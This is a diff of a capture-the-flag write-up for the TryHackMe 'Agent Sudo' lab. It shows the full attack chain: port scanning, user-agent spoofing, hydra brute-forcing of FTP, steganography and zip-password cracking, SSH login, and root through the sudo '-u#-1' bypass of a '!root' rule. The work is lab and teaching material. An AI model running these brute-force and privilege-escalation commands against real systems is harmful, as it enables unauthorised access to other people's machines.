@@ -1,5 +1,5 @@
 ---
-title: "TryHackMe — Agent Sudo (Writeup)"
+title: "TryHackMe — Agent Sudo"
 date: 2025-07-31
 categories: [Capture The Flags, tryHackMe]
 tags: [tryHackMe, CTF, Writeups, Privilege Escalation, Steganography]
@@ -27,6 +27,7 @@ tags: [tryHackMe, CTF, Writeups, Privilege Escalation, Steganography]
 Starting with a comprehensive TCP/service scan using nmap:
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ nmap -A -T4 10.10.39.168 -oN scan
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 22:13 IST
@@ -69,6 +70,7 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 48.21 seconds
+
 ```
 
 ### 1.2 Port Analysis
@@ -93,6 +95,7 @@ The website displays a message instructing agents to use their **codename** as t
 Performing directory brute-force using ffuf to discover hidden paths:
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ ffuf -u http://10.10.39.168/FUZZ \ 
 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
@@ -123,6 +126,7 @@ ________________________________________________
 server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 193ms]
                         [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 187ms]
 :: Progress: [30000/30000] :: Job [1/1] :: 172 req/sec :: Duration: [0:02:29] :: Errors: 2 ::
+
 ```
 
 No hidden directories. I also fuzzed for file extension but the result was same.
@@ -134,6 +138,7 @@ Changing user-agent can be done via two ways: Burpsuite or Curl
 I am going ahead with the curl. Using -A flag to set the user-agent to R, as R is the only agent name we know of as of now.
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ curl -A 'R' -L 10.10.39.168
 What are you doing! Are you one of the 25 employees? If not, I going to report this incident
@@ -154,6 +159,7 @@ What are you doing! Are you one of the 25 employees? If not, I going to report t
 </p>
 </body>
 </html>
+
 ```
 
 Something new, in the first line we can see that in the company there are a total of 25 employees and agent R is not one of those 25 employees.
@@ -166,6 +172,7 @@ Let’s enumerate it by starting from agent A and see
 ### 2.3 User-Agent Header Testing
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ curl -A 'A' -L 10.10.39.168
 
@@ -217,7 +224,8 @@ Attention chris, <br><br>
 Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
 
 From,<br>
-Agent R 
+Agent R
+
 ```
 
 Setting the user-agent as A, and B didn’t give any result but when I set the user-agent to C, we got the above response and from there we can see that agent C stands for Agent Chris
@@ -234,7 +242,9 @@ Using hydra for this purpose
 
 
 ### 3.1 Password Brute Force Attack
+
 ```bash
+
 hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 50 -vV 10.10.39.168 ftp
 
 [ATTEMPT] target 10.10.39.168 - login "chris" - pass "friend" - 247 of 14344399 [child 39] (0/0)
@@ -245,6 +255,7 @@ hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 50 -vV 10.10.39.168 ftp
 [STATUS] attack finished for 10.10.39.168 (waiting for children to complete tests)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 22:32:50
+
 ```
 
 *Got it! and we are done with Q4*
@@ -255,6 +266,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 22:32:
 Now, let’s login into FTP using this credential
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ ftp 10.10.39.168                  
 Connected to 10.10.39.168.
@@ -272,6 +284,7 @@ ftp> ls
 -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
 -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
 -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+
 ```
 
 Upon successfully logging in and listing the files, we find one text file and two images. Downloading them into our system using the get command
@@ -279,7 +292,9 @@ Upon successfully logging in and listing the files, we find one text file and tw
 The text file had the below content:
 
 ### 3.3 Analyzing Downloaded Files
+
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ cat To_agentJ.txt 
 Dear agent J,
@@ -288,6 +303,7 @@ All these alien like photos are fake! Agent R stored the real picture inside you
 
 From,
 Agent C
+
 ```
 
 Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture.
@@ -301,6 +317,7 @@ This tells us that either of the two pictures contains hiddent content and we ha
 Let’s start by analysing the images using exiftool
 
 ```bash
+
 └─$ exiftool cutie.png                                                           
 ExifTool Version Number         : 13.25
 File Name                       : cutie.png
@@ -351,6 +368,7 @@ Color Components                : 3
 Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
 Image Size                      : 440x501
 Megapixels                      : 0.220
+
 ```
 When analysing the cutie.png, we got a warning saying that some data has been appended at the end, so this is our required image
 
@@ -359,6 +377,7 @@ When analysing the cutie.png, we got a warning saying that some data has been ap
 Using binwalk to extract the hiddent content
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ binwalk -e cutie.png          
 
@@ -373,6 +392,7 @@ WARNING: One or more files failed to extract: either no utility was found or it'
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ ls
 cute-alien.jpg  cutie.png  _cutie.png.extracted  scan  To_agentJ.txt
+
 ```
 
 The hidden content is stored in a new directory, which contains a zip file.
@@ -390,6 +410,7 @@ using zip2john to get the hash
 using john to crack the password using rockyou.txt wordlist
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/tryHackMe/rooms/agentSudo/_cutie.png.extracted]
 └─$ zip2john 8702.zip > zipHash.txt   
                                                                                                                                                                              
@@ -404,11 +425,13 @@ REDACTED            (8702.zip/To_agentR.txt)
 1g 0:00:00:00 DONE (2025-07-28 22:44) 3.703g/s 121362p/s 121362c/s 121362C/s christal..eatme1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
+
 ```
 
 that was easy, submitting the cracked password as the answer and extracting the content from zip file using the cracked password
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/rooms/agentSudo/_cutie.png.extracted/8702]
 └─$ ls -la
 total 12
@@ -424,6 +447,7 @@ We need to send the picture to 'QXJlYTUx' as soon as possible!
 
 By,
 Agent R
+
 ```
 
 In the zip file was this txt file which contained the above content
@@ -434,10 +458,12 @@ Upon analysing, that string turned out to be base64 encoded
 Decoding the string:
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ echo QXJlYTUx | base64 -d
 
 Area51
+
 ```
 
 but what to make of this Area51?
@@ -451,6 +477,7 @@ Remember, we found 2 images in the FTP directory? We extracted the zip file from
 ### 4.4 Stegnaography Password Discovery
 
 ```bash
+
 ┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
 └─$ steghide extract -sf cute-alien.jpg
 Enter passphrase: 
@@ -466,6 +493,7 @@ Don't ask me why the password look cheesy, ask agent R who set this password for
 
 Your buddy,
 chris
+
 ```
 
 A message.txt file was extracted from the second image, and upon reading its content, we found two things
@@ -478,6 +506,7 @@ A message.txt file was extracted from the second image, and upon reading its con
 Let’s ssh into his account
 
 ```bash
+
 james@agent-sudo:~$ pwd
 /home/james
 james@agent-sudo:~$ ls -la
@@ -495,6 +524,7 @@ drwx------ 3 james james  4096 Oct 29  2019 .gnupg
 -rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
 james@agent-sudo:~$ cat user_flag.txt 
 <REDACTED FLAG>
+
 ```
 
 
@@ -507,8 +537,10 @@ Setting up a python server to open the image
 ### 5.1 Analysing Alient Image
 
 ```bash
+
 james@agent-sudo:~$ python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
 ```
 
 
@@ -538,13 +570,16 @@ I first checked the kernel version to look for any known vulnerabilities but not
 ## 6. Privilege Escalation
 
 ```bash
+
 james@agent-sudo:~$ uname -a
 Linux agent-sudo 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+
 ```
 
 I moved forward with checking sudo privileges for james
 
 ```bash
+
 james@agent-sudo:~$ sudo -l
 [sudo] password for james: 
 Matching Defaults entries for james on agent-sudo:
@@ -552,6 +587,7 @@ Matching Defaults entries for james on agent-sudo:
 
 User james may run the following commands on agent-sudo:
     (ALL, !root) /bin/bash
+
 ```
 
 Interesting, it says james is allowed to run /bin/bash as any user but not root
@@ -561,13 +597,14 @@ but if you look closely, the restriction is not implemented properly. The proble
 If james does sudo /bin/bash, it will prevent escalation to UID 0 since !root is specified but what if we use a numeric ID instead of the root word
 
 ```bash
+
 james@agent-sudo:~$ sudo -u#-1 /bin/bash
 root@agent-sudo:~# 
 root@agent-sudo:~# id
 uid=0(root) gid=1000(james) groups=1000(james)
+
 ```
 ---
-###
 
 *-u#UID: run the command as the user with the specified numeric UID.*
 
@@ -584,6 +621,7 @@ uid=0(root) gid=1000(james) groups=1000(james)
 Going to root directory and getting the root flag
 
 ```bash
+
 root@agent-sudo:~# cd /root
 root@agent-sudo:/root# cat root.txt 
 To Mr.hacker,
@@ -595,6 +633,7 @@ REDACTED
 
 By,
 DesKel a.k.a Agent R
+
 ```
 
 *Q13. (Bonus) Who is Agent R? Deskel*
